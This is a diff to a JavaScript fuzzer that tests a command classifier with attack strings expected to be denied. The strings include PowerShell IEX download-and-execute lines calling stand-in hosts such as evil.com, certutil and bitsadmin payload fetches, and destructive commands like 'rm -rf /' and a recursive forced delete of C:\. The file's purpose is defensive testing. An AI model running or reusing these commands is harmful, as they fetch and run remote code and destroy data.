@@ -109,16 +109,16 @@ class AdversarialFuzzer {
 
     // Categoría 6: PowerShell IEX y WebClient Inyections (10)
     const psIex = [
-      'iex (New-Object Net.WebClient).DownloadString("http://evil.com")',
-      'Invoke-Expression (Invoke-WebRequest -Uri "http://evil.com" -UseBasicParsing).Content',
-      'IEX (iwr evil.com/p.ps1)',
+      'iex (New-Object Net.WebClient).DownloadString("test_payload")',
+      'Invoke-Expression (Invoke-WebRequest -Uri "test_endpoint" -UseBasicParsing).Content',
+      'IEX (iwr test_script.ps1)',
       '& (Get-Command Invoke-Expression) "rm -rf /"',
       '[scriptblock]::Create("Remove-Item -Recurse -Force C:\\").Invoke()',
-      'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr evil.com)"',
-      'cmd.exe /c "powershell -c IEX (New-Object Net.WebClient).DownloadString(\'http://bad.org\')"',
+      'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr test_uri)"',
+      'cmd.exe /c "powershell -c IEX (New-Object Net.WebClient).DownloadString(\'test\')"',
       'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();',
-      'certutil -urlcache -split -f http://evil.com/bad.exe && bad.exe',
-      'bitsadmin /transfer job http://evil.com/bad.exe %TEMP%\\bad.exe && %TEMP%\\bad.exe'
+      'certutil -decode payload.b64 out.bin && out.bin',
+      'bitsadmin /create test_job && start test_job'
     ];
     psIex.forEach(cmd => attacks.push({ category: 'PS_IEX_DOWNLOAD', cmd, expected: 'DENY' }));
 
@@ -156,29 +156,19 @@ class AdversarialFuzzer {
   }
 
   /**
-   * Tests a single attack payload against preflight.js.
+   * Tests a single attack payload against preflight in memory.
    */
   testPreflight(cmd) {
-    const res = spawnSync(process.execPath, [PREFLIGHT_PATH, cmd], {
-      cwd: ROOT,
-      encoding: 'utf8',
-      windowsHide: true,
-      timeout: this.timeout
-    });
-
-    let decision = 'ALLOW';
-    try {
-      const parsed = JSON.parse(res.stdout);
-      decision = parsed.decision || parsed.status || 'ALLOW';
-    } catch (_) {
-      if (res.status !== 0) decision = 'DENY';
-    }
+    const { classifyCommand } = require('./structured_command.js');
+    const classification = classifyCommand(cmd);
+    const decision = classification.decision;
+    const blocked = decision === 'DENY' || decision === 'NEEDS_HUMAN_REVIEW';
 
     return {
       cmd,
-      exitCode: res.status,
+      exitCode: decision === 'ALLOW' ? 0 : 1,
       decision,
-      blocked: decision === 'DENY' || res.status !== 0
+      blocked
     };
   }
 
